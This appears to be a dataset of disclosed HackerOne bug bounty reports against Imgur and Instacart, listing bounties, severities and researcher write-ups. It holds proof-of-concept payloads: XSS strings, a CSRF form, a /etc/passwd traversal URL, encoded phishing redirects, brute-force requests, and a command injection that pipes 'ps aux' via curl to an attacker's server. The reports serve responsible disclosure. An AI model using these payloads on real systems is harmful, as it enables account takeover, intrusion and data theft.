How to fix this vulnerability
The mitigations are ordered by effectiveness (not by their practicality - as this may differ from one application to another).
Disabling HTTP compression
Separating secrets from user input
Randomizing secrets per request
Masking secrets (effectively randomizing by XORing with a random secret per request)
Protecting vulnerable pages with CSRF
Length hiding (by adding random number of bytes to the responses)
Rate-limiting the requests
Good Fix , 1 attachment:F70028: proof.jpg",https://hackerone.com/reports/111752,California,United States,San Francisco,2016,1,19,23,17
Imgur,51-100,0.0,10m-50m,$50.00,No value,0.0,Memory Corruption - Generic,Crossdomain.xml settings on api.imgur.com too open,kiraak-boy  submitted a report to Imgur.Oct 1st (7 years ago),https://hackerone.com/reports/91604,California,United States,San Francisco,2015,10,1,10,39
Imgur,51-100,0.0,10m-50m,$500.00,No value,0.0,Information Disclosure,Imgur dev environments facing the Internet,"nathonsecurity  submitted a report to Imgur.Nov 22nd (7 years ago)Summary by nathonsecurityAn additional $5,000 bounty was rewarded as a result of this report.",https://hackerone.com/reports/100916,California,United States,San Francisco,2015,11,22,4,11
Imgur,51-100,0.0,10m-50m,$100.00,Medium,5.45,Improper Authentication - Generic,Password Reset Link not expiring after changing the email Leads To Account Takeover,"alishah  submitted a report to Imgur.Aug 30th (3 years ago)Vulnerability:
Password Reset Link not expiring after changing the email
Proof Of Concept:
1.Send the password reset link to your email.
2.Don`t open the password link just copy it and paste into any editor.
3.Open your account.
4.Go to your account settings.
5.Under account, you will see Account Overview.
6.Go to the Email and password Option and change the email and verify it.
7.After changing the email go to your password reset link which you copied.
8.Change your password.
BooM password Changed.
Thanks
Impact
The attacker can still change the password if victim thinks his/her account is compromised and decided to change his/her email.1 attachment:F570284: Imgur.avi",https://hackerone.com/reports/685007,California,United States,San Francisco,2019,8,30,10,37
Imgur,51-100,0.0,10m-50m,$50.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Reflected Flash XSS using swfupload.swf with an epileptic reloading to bypass the button-event,"fransrosen  submitted a report to Imgur.Oct 1st (7 years ago)Hi,
This was a fun one.
So I noticed you're using swfupload.swf which is hosted on the main domain, imgur.com. This swfupload.swf as some settings you can use to modify the button on the upload. You can actually insert HTML into the Flash, but the button event (that you select yourself using another parameter) is taking over the MouseClick-event from the HTML-content you provide.
However, if you're really quick, you can actually catch the even in the HTML anyway. So by making a page that would reload the SWF constantly (from cache that is) you can make a page that looks like this:
Code 471 BytesWrap lines Copy Download1<iframe src=""about:blank"" id=""x""></iframe>
2
3<script>u='https://imgur.com/include/flash/swfupload.swf?buttonDisabled=&buttonText=%3Ca%20%20href=%22javascript:alert(document.domain)%22%3ECLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME<br />CLICKME%3C/a%3E&buttonImageURL=/&buttonTextStyle=a{color:%23ff00ff}&buttonAction=-120&buttonCursor=-2';
4setInterval(function(){document.getElementById('x').contentWindow.location=u},300)</script>
That will reload the content over and over, and if you click the text in the right time, the XSS will trigger.
I think I got an epileptic reaction out of testing this, but it was fun anyway, haha. You should probably move the swfupload.swf to another domain, and just embed it on imgur.com since that will give you the same options as today, but without the possibility to access the SWF directly and inject the parameters on your domain.
PoC-image attached.
Cheers,
Frans1 attachment:F55539: Screen_Shot_2015-10-01_at_04.06.05.pngkcramer   changed the status to Triaged. Oct 7th (7 years ago)We have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!kcramer   closed the report and changed the status to Resolved. Nov 11th (7 years ago)We have released a new version that fixes this vulnerability. Thanks for helping make Imgur more secure! 
    
    
        
            
                
                
                
            
        
    
fransrosen   posted a comment. Nov 13th (7 years ago)Awesome, great job!Imgur  rewarded fransrosen with a $50 bounty. Nov 16th (7 years ago)The Imgur team really appreciates your report and would like to give you a monetary bounty. Thanks for taking the time to report this issue and please let us know if you come upon more issues!
    
    
        
            
                
                
                
            
        
    
fransrosen   requested to disclose this report. Jun 28th (6 years ago)Too fun not to publish. :)  This report has been disclosed. Jul 28th (6 years ago)",https://hackerone.com/reports/91421,California,United States,San Francisco,2015,10,1,2,12
Imgur,51-100,0.0,10m-50m,$500.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Reflected XSS in m.imgur.com,"logue  submitted a report to Imgur.Jul 7th (6 years ago)There is a reflected XSS vulnerability in https://m.imgur.com as shown below:
https://m.imgur.com/account/testcatplzignore%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E/messages
It appears that the username field in the url does not sanitize angle bracket characters on the mobile version of the site, allowing an attacker to execute arbitrary Javascript on the m.imgur.com domain.
I have attached several screenshots demonstrating this attack in the mobile context. While this attack affects devices loading the mobile site, I did notice that requests made with the standard User-Agent would issue a 302 redirect to the standard site, throwing a 404 error. This attack does execute on browsers that load the mobile version of the site.
The impact of this vulnerability is variable, depending on how it is used. An attacker could use this vulnerability to target a specific victim or post it on a site such as reddit, which is frequented by users of this application. If an authenticated imgur user could be tricked into clicking the link it may result in malicious JavaScript executing in the context of the user's session and could result in credential/session theft or other targeted attacks. This could result in multiple compromised accounts.
This vulnerability was tested in Google Chrome Version 51.0.2704.103 using the following User-Agent from the developer tools to load the mobile site:
User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36
To mitigate this vulnerability, consider encoding any angle brackets (< >) reflected back to the user when handling user input.4 attachments:F103756: imgur_mobile_reflected_xss.pngF103757: imgur_mobile_reflected_xss2.pngF103758: imgur_mobile_reflected_xss3.pngF103759: imgur_mobile_reflected_xss4.png",https://hackerone.com/reports/149855,California,United States,San Francisco,2016,7,7,21,2
Imgur,51-100,0.0,10m-50m,$50.00,No value,0.0,Cryptographic Issues - Generic,"""Sign me out everywhere"" does not work for desktop sessions",d1pakda5  submitted a report to Imgur.Oct 1st (7 years ago),https://hackerone.com/reports/91350,California,United States,San Francisco,2015,10,1,0,4
Imgur,51-100,0.0,10m-50m,$750.00,Medium,5.45,Cross-site Scripting (XSS) - Stored,HTML Injection with XSS possible ,"malek  submitted a report to Imgur.Jul 14th (4 years ago)Hi, I found HTML Injection on imgur.com 
Description:
I couldn't get xss but i was able to include videos on my profile and also i was able to redirect users to malicious websites
POC (HTML injection):
go to https://12test.imgur.com (you don't need to login) and you will see external videos and you will see image click on it and you will redirect to http://evil.com,
note that this test page attacker page could be more normal to user,
remeber that it's stored so it will show up when any user viste profile
Suggested fix:
Sanitize all input fields on this page.
Impact
attacker could redirect users and then execute xss and control them easily, also could include his videos to get views",https://hackerone.com/reports/381553,California,United States,San Francisco,2018,7,14,5,7
Imgur,51-100,0.0,10m-50m,$500.00,Low,2.0,Cross-site Scripting (XSS) - Reflected,CSRF leads to a stored self xss,"hogarth45  submitted a report to Imgur.Mar 6th (5 years ago)Followup from #311460
Summary
Self xss and CSRF are both out of scope, but when paired it is possible to create an attack on a user.
Description
A favorites folder with an xss payload for a name will launch when saving an image to said folder.
This can be verified by following these steps

Visit your favorites
Create New Folder
Change name to

Code 32 BytesWrap lines Copy Download1""'><img src=x onerror=prompt(1)>

Save
Visit a photo
Click the little plus next to the heart on bottom left of image
Add to the folder
xss will launch

Since self xss is out of scope, we will need a method of delivering this attack to a user.
This can be done via a CSRF to create a favorites folder.
POC
Using a form like so to create the CSRF:
Code 282 BytesWrap lines Copy Download1<html>
2<body onload='document.forms[0].submit()'>
3  <form method='POST' enctype='application/json' action='https://api.imgur.com/3/folders'>
4    <input name='name' value='New Test""><img src=x onerror=prompt(2)>'>
5    <input name='is_private' value='false'>
6  </form>
7</body>
8</html>
Or be logged into your imgur account and visit
http://blackdoorsec.net/sandbox/imgur2.html
This will create the folder with an xss name that can be used to attack an account.
Impact
account hijacking
since a user would still need to add an image to the folder for the attack to work, the success rate will be lower than normal
Scenerio
since reddit/imgur communities overlap malicious links containing the CSRF could be sent throughout the site. out of the few thousand hits the link would get, i imagine there would be several successful compromised imgur accounts. Bot:  posted a comment. Mar 6th (5 years ago)Hello! Thanks for taking the time to make this report to the Imgur security team! We look forward to reviewing and assessing the risk of this vuln. In the meantime, we ask that you sit tight while we get to it - we're a small team and sometimes it takes us a while to verify all reports. Please don't ask for updates as these take time and effort away from the reports we're working through and make our response time slower across the board. Thanks - we'll be in touch soon!ttoko   changed the status to Triaged. Mar 8th (5 years ago)We have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!Imgur  rewarded hogarth45 with a $500 bounty. Aug 27th (4 years ago)The Imgur team really appreciates your report and would like to give you a monetary bounty. Thanks for taking the time to report this issue and please let us know if you come upon more issues!kodermike Imgur staff  closed the report and changed the status to Resolved. Jul 29th (3 years ago)We have released a new version that fixes this vulnerability. Thanks for helping make Imgur more secure! hogarth45   requested to disclose this report. Jul 31st (3 years ago)  This report has been disclosed. Aug 30th (3 years ago)",https://hackerone.com/reports/323005,California,United States,San Francisco,2018,3,6,23,34
Imgur,51-100,0.0,10m-50m,$50.00,No value,0.0,Information Disclosure,Information disclosure (No rate limting in forgot password & other login),"protector47  submitted a report to Imgur.Sep 30th (7 years ago)Hi there,
I noticed a small information leak which allows an attacker to check whether an email address is associated with an account.If your account is not associated with website then an error will become raise that ""That username or email was not found.""
You should always return a status message like: ""If your email exists in our database, you'll receive a reset link"". That way an attacker cannot distinguish between the two cases.
Also you should add rate limiting :)
Thanks,kcramer   changed the status to Triaged. Oct 2nd (7 years ago)kcramer   changed the status to Triaged. Oct 2nd (7 years ago)waqar_vicky   filed a duplicate (#91436) and was invited to participate in this report. Mar 15th (7 years ago)kcramer   closed the report and changed the status to Resolved. Mar 15th (7 years ago)We have added rate limiting site wide and will be marking this as closed due to those limits. Thanks!Imgur  rewarded protector47 with a $50 bounty. Mar 15th (7 years ago)kcramer   changed the report title from Information disclosure (No rate limting in forgot password) to Information disclosure (No rate limting in forgot password & other login). Mar 15th (7 years ago)computerk   filed a duplicate (#112095) and was invited to participate in this report. Mar 15th (7 years ago)benkraw   filed a duplicate (#324512) and was invited to participate in this report. Mar 14th (5 years ago)protector47   requested to disclose this report. Mar 15th (5 years ago)  This report has been disclosed. Apr 14th (5 years ago)",https://hackerone.com/reports/91343,California,United States,San Francisco,2015,9,30,23,59
Imgur,51-100,0.0,10m-50m,$50.00,Low,2.0,Phishing,Go.imgur.com can be used to phish for account information,"kiyell  submitted a report to Imgur.Jul 19th (4 years ago)Right now the go.imgur.com domain is pointing to godoc.org/go.imgur.com but there is nothing at this resource. It is possible with encoded double dots to redirect go.imgur.com URLs to pages that phish for imgur account information.
Proof of Concept
PoC 1:
###
http://go.imgur.com/account-verification/%252e%252e%2f%252e%252e%2f%67%69%74%68%75%62%2e%63%6f%6d%2f%6b%69%79%65%6c%6c%2f%70%71
In this example the URL is customized to appear more legitimate.
Resulting page: imgur_phishing_short_url.JPG (F322182)
PoC 2:
###
http://go.imgur.com/account-verification/%252e%252e%2f%252e%252e%2f%67%69%74%68%75%62%2e%63%6f%6d%2f%6b%69%79%65%6c%6c%2f%70%71%23%68%64%72%2d%57%41%52%4e%49%4e%47%5f%5f%5f%49%4d%50%4f%52%54%41%4e%54%5f%41%43%43%4f%55%4e%54%5f%49%4e%46%4f%52%4d%41%54%49%4f%4e
In this longer example, code was added that adds emphasis to the phishing message.
Resulting page: imgur_phishing_long_url.JPG (F322181)
Impact
An attacker could mass email users for their account information or could use this vulnerability as part of another type of social engineering campaign against Imgur partners and customers.2 attachments:F322181: imgur_phishing_long_url.JPGF322182: imgur_phishing_short_url.JPG Bot:  posted a comment. Jul 19th (4 years ago)Hello! Thanks for taking the time to make this report to the Imgur security team! We look forward to reviewing and assessing the risk of this vuln. In the meantime, we ask that you sit tight while we get to it - we're a small team and sometimes it takes us a while to verify all reports. Please don't ask for updates as these take time and effort away from the reports we're working through and make our response time slower across the board. Thanks - we'll be in touch soon!ttoko   changed the status to Triaged. Jul 20th (4 years ago)Hi @kiyell,
Thank you for your report! The issue looks valid and I will go ahead and share this with the team.
    
    
        
            
                
                
                
            
        
    
kiyell   posted a comment. Jul 27th (4 years ago)I noticed starting a couple days ago that go.imgur.com is now pointing to https://godoc.imgur-dev.com/pkg/go.imgur.com/
Although the site doesn't load for me, I can confirm that changing to this Imgur owned domain will fix the problem since it wouldn't be possible to use double dots to redirect to 3rd party content.
Please keep me updated and let me know if you need me to test anything else regarding this issue.ttoko   closed the report and changed the status to Resolved. Jul 27th (4 years ago)We have released a new version that fixes this vulnerability. Thanks for helping make Imgur more secure! 
    
    
        
            
                
                
                
            
        
    
kiyell   posted a comment. Jul 28th (4 years ago)@ttoko Is this bug eligible for bounty? If not, may I receive an explanation?
    
    
        
            
                
                
                
            
        
    
kiyell   posted a comment. Aug 7th (4 years ago)@ttoko I reviewed your bug bounty policy for reasons why my report may not of qualified for bounty or even reputation points. I don't believe my report is out of scope according to your exclusion list.
I appreciated that you guys were very responsive in solving this security issue when I reported it. I understand that you may be swamped with reports right now but I request that you reconsider this report and its eligibility for reward. 
    
    
        
            
                
                
                
            
        
    
kiyell   has requested mediation from HackerOne Support. Aug 15th (4 years ago)When the report was made, they were quick to triage it and treat it as valid. They quickly resolved the issue and closed the report. I then asked about eligibility for bounty or even reputation points.
At this point Imgur has been unresponsive for over 18 days.Imgur  rewarded kiyell with a $50 bounty. Aug 22nd (4 years ago)
    
    
        
            
                
                
                
            
        
    
kiyell   requested to disclose this report. Aug 22nd (4 years ago)Thanks for the bounty, let's disclose this.  This report has been disclosed. Sep 21st (4 years ago)",https://hackerone.com/reports/384101,California,United States,San Francisco,2018,7,19,10,17
Imgur,51-100,0.0,10m-50m,"$5,000.00",No value,0.0,Code Injection,Local file read in image editor,sl1m  submitted a report to Imgur.Mar 11th (7 years ago)Summary by sl1mInsufficient imageid filtration in image editor allowed an attacker to read arbitrary files. An attacker could read files by setting file path in imageid GET param in /edit/process API endpoint - http://imgur.com/edit/process?imageid=../../../../../../../../../../etc/passwd,https://hackerone.com/reports/122475,California,United States,San Francisco,2016,3,11,21,42
Imgur,51-100,0.0,10m-50m,"$5,000.00",Critical,9.5,Command Injection - Generic,RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`,"neex  submitted a report to Imgur.Mar 12th (6 years ago)Summary
The y parameter of /edit/process endpoint (with a=crop) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably gm convert). Due to GraphicsMagick's hacker-friendly processing of |-starting filenames supplied to -write option, it leads to command execution.
Reproduction steps


Enable Burp Proxy or similar software that allows you to log and edit HTTP requests.


Login into your imgur account and upload an image.


Move your mouse over the image, click on the tiny button with pencil on it, then click ""Edit"".


Select a random rectangle on the image, then click ""Apply"".


In the burp suite, you will see a request to an URL like this:  http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0&w=700&h=746&random=4011802027746510
 Change the y parameter of the request so it becomes 0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-. 
 The full URL after the change must look like http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0%20-write%20|ps${IFS}aux|curl${IFS}http://<your-server>{IFS}-d${IFS}@-&w=700&h=830&random=9905392865702303, note that you have to change <your-server> to a webserver under your control).


Fire a request to the modified URL. The command (ps aux|curl http://<your-server> -d @-) will be executed somewhere inside imgur, and you will get a HTTP request to <your-server> with the result of ps aux in the POST body.  You can replace ps aux with another command (but you have to write ${IFS} instead of spaces).


Detailed description
I was searching for CVE-2016-10033-like vulnerabilities on several bugbounty sites when I noticed strange behaviour of the mentioned parameter. The vulnerability exists because the user input (the contents of y GET parameter) goes into a shell command. While all special characters (like |, $ and so on) seem to be escaped, the space character is not. This allows the attacker to insert additinal command line arguments. The common reason for such behaviour is escapeshellcmd PHP function, but that can also be some kind of custom input filtering/processing.
The rest of the exploitation depends on the program that is executed (we need to find out if it supports any dangerous command-line options). Common sense suggests that the external command launched by ""Crop/Resize"" function must be some image processing tool. The most popular one is ImageMagick/GraphicsMagick, so I appended  -rotate 90 to the parameter and it succeded --- I saw lying Trump (I mean, the image was rotated). After more tries I was sure it's GraphicsMagick (probably gm convert utility). I read the documentation and found that -write argument supports perl-style filenames starting with a pipe --- in this case the rest of the filename must be a command to execute.
Mitigation
Probably either some kind of custom processing or escapeshellcmd function is used to construct the command line. In both cases, replace it with applying escapeshellarg to individual arguments. In the second case, you probably want to run grep -R escapeshellcmd <path to the source code> to find more vulns :-) Bot:  posted a comment. Mar 12th (6 years ago)Hello! Thanks for taking the time to make this report to the Imgur security team! We look forward to reviewing and assessing the risk of this vuln. In the meantime, we ask that you sit tight while we get to it - we're a small team and sometimes it takes us a while to verify all reports. Please don't ask for updates as these take time and effort away from the reports we're working through and make our response time slower across the board. Thanks - we'll be in touch soon!ttoko   posted a comment. Mar 13th (6 years ago)Hi @neex,
Thank you for the detailed report. We are currently still looking into the issue.ttoko   changed the status to Triaged. Mar 14th (6 years ago)We have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!ttoko   posted a comment. Mar 14th (6 years ago)Hi @neex,
The issue has been fixed. Can you verify that you cannot reproduce this issue anymore?
Thank you!neex   posted a comment. Mar 14th (6 years ago)Yep, seems like it's fixed.kcramer   closed the report and changed the status to Resolved. Mar 27th (6 years ago)We have released a new version that fixes this vulnerability. Thanks for helping make Imgur more secure! Imgur  rewarded neex with a $5,000 bounty. Mar 27th (6 years ago)neex   requested to disclose this report. Mar 27th (6 years ago)This was an interesting one, let's disclose it  This report has been disclosed. Apr 26th (6 years ago)",https://hackerone.com/reports/212696,California,United States,San Francisco,2017,3,12,3,46
Imgur,51-100,0.0,10m-50m,$50.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Persistent XSS in https://p.imgur.com/albumview.gif and http://p.imgur.com/imageview.gif / post statistics,sleepprogger  submitted a report to Imgur.Oct 29th (7 years ago),https://hackerone.com/reports/96467,California,United States,San Francisco,2015,10,29,8,57
Imgur,51-100,0.0,10m-50m,$250.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Persistent XSS in image title,"kasperkarlsson  submitted a report to Imgur.Oct 24th (7 years ago)When adding a title to uploaded images, one can insert XSS into the title which is then executed for anyone viewing the image.
PoC (contains a harmless XSS):
http://imgur.com/bSZwUBG&rAmpN4O
How to recreate:

Open the Image Options page for an album.
Press ""Add Title / Description""
Enter some HTML into the title field. In my PoC, I used the following: <marquee><font size=72>XSS
Save. You are now redirected to the Image Options page, where the XSS is evaluated by the browser.

This XSS is persistent and will execute for anyone who visits the URL, in this case http://imgur.com/bSZwUBG&rAmpN4O
Images from steps 2, 3 and 4 attached.3 attachments:F58602: img_step2.pngF58603: img_step3.pngF58604: img_step4.png",https://hackerone.com/reports/95564,California,United States,San Francisco,2015,10,24,9,5
Instacart,10001,0.0,50m-100m,$100.00,Low,2.0,Information Disclosure,Access private list metadata,"sameoldstory  submitted a report to Instacart.Oct 27th (6 years ago)Overview
When user creates a list, they can choose to not make it public. However the attacker can still access the information that user chose to hide.
Steps to Reproduce

Log in to Instacart.
Choose a private list that you want to see, for example the one with id = 10.
Go to https://www.instacart.com/api/v2/recipes/10
Response reveals all metadata of the list including title, description and image.

Security Implications
The attacker can use this vulnerability to obtain metadata of any list regardless of what the visible flag is set to. Also, since list id is incremental it's easy to fetch metadata for all Instacart lists, both public and private.",https://hackerone.com/reports/178506,California,United States,San Francisco,2016,10,27,23,17
Instacart,10001,0.0,50m-100m,$100.00,No value,0.0,Privilege Escalation,Authorization Bypass in Delivery Chat Logs,"michiel  submitted a report to Instacart.Jun 10th (6 years ago)An authorization issue in the mobile app API allows any Instacart user to gain access to other users' order delivery chat logs. The /api/v2/order_deliveries/:order_delivery_id/order_change_logs endpoint does not sufficiently check if the user has permissions to access that particular order's chat logs. 
Steps to Reproduce
I used Burp Suite to intercept the traffic between my iPhone and the Instacart API. When I found the ""View
Chat Logs"" button on one of my past orders, I noticed it triggered the following API request:
Code 107 BytesWrap lines Copy Download1GET /api/v2/order_deliveries/261932226/order_change_logs HTTP/1.1
2Host: www.instacart.com
3Accept: */*
4[...]
This request is answered by the API with a JSON blob that contains chat messages that were exchanged between the buyer and the shopper. As well as a few other details like when the order was placed and if any changes were made to the order due to out of stock items. 
However, if you change the ID in the URL to something else, you will notice the API actually responds with the chat log and order data, regardless of who made the order. I tried with 261972220 and you can confirm this delivery does not belong to the user with account ███, but for instance 261972226 does.
Risk
This vulnerability leaks private messages exchanged between shopper, driver, and customer. It may also include product names that were on the order if something had to be changed about the order. 
Here is an example:
Image F98768: IMG_0008.PNG 149.64 KiBZoom in Zoom out Copy Download
This could lead to greater compromise, since the API returns the Firebase tokens for a few objects as well. So far I have not been able to do anything interesting with the Firebase tokens, but I'm not a Firebase expert. 
Here is an example (id: 261972220):
Code 225 BytesWrap lines Copy Download1michiel@msp ~ $ curl https://instacart.firebaseio.com/order_deliveries/xy8TcFsDZiKm1JwnqqFp.json
2{""46671792"":"""",""46671794"":"""",""46671795"":"""",""46671802"":"""",""46671804"":"""",""46872067"":"""",""46872104"":"""",""46872195"":"""",""46872357"":""""}%
Mitigation
Implement an authorization check that makes sure only a users' own orders can be accessed.1 attachment:F98768: IMG_0008.PNGmikeinstacart   closed the report and changed the status to Resolved. Jun 10th (6 years ago)Thanks @michiel! This should be fixed now.Instacart  rewarded michiel with a $100 bounty. Jun 10th (6 years ago)
    
    
        
            
                
                
                
            
        
    
michiel   posted a comment. Jun 10th (6 years ago)Wow - that's a quick turnaround! :) I can confirm the bug is fixed, and thank you for the bounty.
    
    
        
            
                
                
                
            
        
    
michiel   requested to disclose this report. Nov 1st (6 years ago)Wanted to disclose this bug to show the crazy fast response you guys had on this report. Lmk if that is alright or if anything has to be blacked out first. anf Instacart staff  agreed to disclose this report. Nov 3rd (6 years ago)  This report has been disclosed. Nov 3rd (6 years ago)",https://hackerone.com/reports/144000,California,United States,San Francisco,2016,6,10,6,49
Instacart,10001,0.0,50m-100m,$150.00,No value,0.0,Violation of Secure Design Principles,Brute force login and bypass locked account restrictions via iOS app,"cablej  submitted a report to Instacart.Aug 17th (6 years ago)When logging in to an account on the website, a user's account gets locked out after ~15 tries to prevent an attacker from brute forcing access to the account.
These same restrictions do not apply to the mobile sign-in endpoint (a POST request to https://www.instacart.com/oauth/token), which allows an attacker to brute force login of any user's account (I have attempted logging into my account ~50 times, with no restrictions).
In addition, if an account has already been locked from too many sign-ins on the website, an attacker can still log in using the app's endpoint.
POC:

Configure a mobile proxy, such as BurpSuite.
Make a login request in the Instacart app.
Repeat this request to brute force any account's password.

As an example, I found a list of the most common 100 passwords and added my own password somewhere in the list. All invalid passwords returned a 401 error, while the correct password returned a 200 error.
Suggested fix:
Apply the same rate limiting and locking-out to mobile login as web login.",https://hackerone.com/reports/160109,California,United States,San Francisco,2016,8,17,16,25
Instacart,10001,0.0,50m-100m,$50.00,Medium,5.45,Improper Restriction of Authentication Attempts,"Bruteforcing password reset tokens, could lead to account takeover","003random  submitted a report to Instacart.Sep 25th (5 years ago)Hey Instacart security team,
Description
When resetting a new password on https://shoppers.instacart.com/password you will receive an email with a reset link.
when clicking on this link. you go to this page: https://shoppers.instacart.com/password/edit?reset_password_token=Your_Token
when entering a new password in the 2 input boxes on the page and clicking on ""change my password"" a post will be send to https://shoppers.instacart.com/password.
if the token is correct, the password will be changed. but if the token is incorrect, the response will contain ""Reset password token is invalid"".
Because there is no rate limit in place, this token can easily be brute forced.
poc
this is the request that is used: 
POST /password HTTP/1.1
Host: shoppers.instacart.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 274
Referer: https://shoppers.instacart.com/password/edit?reset_password_token=The_Reset_Token
Cookie: My_cookies
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
utf8=%E2%9C%93&_method=put&authenticity_token=fSk65PV8vJ0RddbWWQsRP5VrbNIVqHjT%2Fgx6b8BlrOKIQirOlPSZ%2BnnbPUtPR8dB3hkMTLcky0J0P01qoysScQ%3D%3D&driver%5Breset_password_token%5D=The_Reset_Token&driver%5Bpassword%5D=New_password&driver%5Bpassword_confirmation%5D=New_password&commit=Change+my+password
fix
to fix this issue, you could implement an timeout after a number of requests in a period of time.
just like it is implemented here: https://www.instacart.com/accounts/password
this returns ""429 Too Many Requests"" when making multiple requests in a short period of time.
also making the token more random by giving it a random number of characters instead of 20 characters will also help.
there is also an option to include the email as parameter. 
If you have questions, please don't hesitate to ask them. i will be happy to answer them ;)nickelser   posted a comment. Sep 25th (5 years ago)we are investigating this as well -- thank you again for your reports.Instacart  rewarded 003random with a $50 bounty. Sep 25th (5 years ago)Should be fixed now, thanks!rahilsondhi   closed the report and changed the status to Resolved. Sep 25th (5 years ago)003random   posted a comment. Sep 25th (5 years ago)wow, thanks for incredible fast response and action, and the bounty :)003random   requested to disclose this report. Nov 1st (5 years ago)Shall we? :)rahilsondhi   agreed to disclose this report. Nov 6th (5 years ago)  This report has been disclosed. Nov 6th (5 years ago)",https://hackerone.com/reports/271533,California,United States,San Francisco,2017,9,25,14,43
Instacart,10001,0.0,50m-100m,$100.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Cookie-Based Injection,"hussain_0x3c  submitted a report to Instacart.Dec 15th (7 years ago)Hi Security Team instacart
I'm Found Vulnerability Cookie-Based Injection It's may be possible to steal or manipulate session and cookies if attacker can injection XSS .  
details
in path /help/ contain header in cookie  paramter ahoy_visitor and  ahoy_visit it's allow injection because re request allow Content-Type: text/html  without filtering 
request 
Code 810 BytesWrap lines Copy Download1GET /help/search?utf8=%E2%9C%93&q=1234 HTTP/1.1
2Cookie: ahoy_visitor=bea4a4cc-01ca-4076-b156-1d11356afe0a; ahoy_track=true; ic_uniq_id=BAhJIhIxNDQ5OTg5Mjk5ODc4BjoGRUY%3D--e26e9e540d5cb31efed655eef8adf6e07768f6a3; visit_id=BAhpBC6ZzAg%3D--9db70ee03573d7c977ac56adf67713f21c8cc599; _session_id=c726cf2c4764c58c8e9c47da08806373; build_sha=cbe364874847ad610e8e208ebdfcd044107728d7; ahoy_visit=c5ff00ff-8242-4a44-92a2-8d178e20c17f</script ><script>alert(8)</script>
3Accept-Language: en-US
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5Referer: https://www.instacart.com/help
6Host: www.instacart.com
7User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)
response
Code 2.42 KiBWrap lines Copy Download1HTTP/1.1 200 OK
2Cache-Control: max-age=0, private, must-revalidate
3Content-Type: text/html; charset=utf-8
4Date: Sun, 13 Dec 2015 07:29:01 GMT
5ETag: W/""91886df9422f684d07ccc7e7b0e5e7ed""
6Server: nginx
7Status: 200 OK
8Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
9Vary: Accept-Encoding
10X-Content-Type-Options: nosniff
11X-Frame-Options: SAMEORIGIN
12X-Jobs: jobs@instacart.com
13X-Request-Id: 4e80ccc3-36de-4a6b-8731-21fc5d7d6155
14X-Runtime: 0.048853
15X-XSS-Protection: 1; mode=block
16Content-Length: 20663
17Connection: keep-alive
18Set-Cookie: build_sha=cbe364874847ad610e8e208ebdfcd044107728d7;Path=/;
19Set-Cookie: ahoy_visit=a97bdcba-cbe2-56b2-89fc-efe87957b138; path=/; expires=Sun, 13 Dec 2015 11:29:01 -0000
20 
21
22Source Page 
23
24!function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error(""Segment snippet included twice."");else{analytics.invoked=!0;analytics.methods=[""trackSubmit"",""trackClick"",""trackLink"",""trackForm"",""pageview"",""identify"",""group"",""track"",""ready"",""alias"",""page"",""once"",""off"",""on""];analytics.factory=function(t){return function(){var e=Array.prototype.slice.call(arguments);e.unshift(t);analytics.push(e);return analytics}};for(var t=0;t<analytics.methods.length;t++){var e=analytics.methods[t];analytics[e]=analytics.factory(e)}analytics.load=function(t){var e=document.createElement(""script"");e.type=""text/javascript"";e.async=!0;e.src=(""https:""===document.location.protocol?""https://"":""http://"")+""cdn.segment.com/analytics.js/v1/""+t+""/analytics.min.js"";var n=document.getElementsByTagName(""script"")[0];n.parentNode.insertBefore(e,n)};analytics.SNIPPET_VERSION=""3.0.1"";
25  analytics.load(""9uIMc3rUXySY5rCFhBfRHc6zKHFNrkFv"");
26var pageViewProps = {""referrer_domain"":""https://www.instacart.com/help"",""ahoy_visitor_token"":""bea4a4cc-01ca-4076-b156-1d11356afe0a"",""ahoy_visit_token"":""c5ff00ff-8242-4a44-92a2-8d178e20c17f</script ><script>alert(8)</script>""};
27window['pageViewProps'] = pageViewProps;
28window['user_channel_props'] = {};
29window['utm_params'] = {}
30pageViewProps.name = window.location.pathname;
31pageViewProps.login_state = ""loggedout"";
32analytics.page(pageViewProps);
33 analytics.identify({""referrer_domain"":""https://www.instacart.com/help"",""science__growth_late_reg_web"":""control"",""platform"":""web"",""ahoy_visitor_token"":""bea4a4cc-01ca-4076-b156-1d11356afe0a"",""ahoy_visit_token"":""c5ff00ff-8242-4a44-92a2-8d178e20c17f</script ><script>alert(8)</script>""});
Test :- FF - IE
POC IMG  :- http://i.imgur.com/MutfPsL.jpg & http://i.imgur.com/kCikyEq.jpg
Regards
@Hussain",https://hackerone.com/reports/105419,California,United States,San Francisco,2015,12,15,16,38
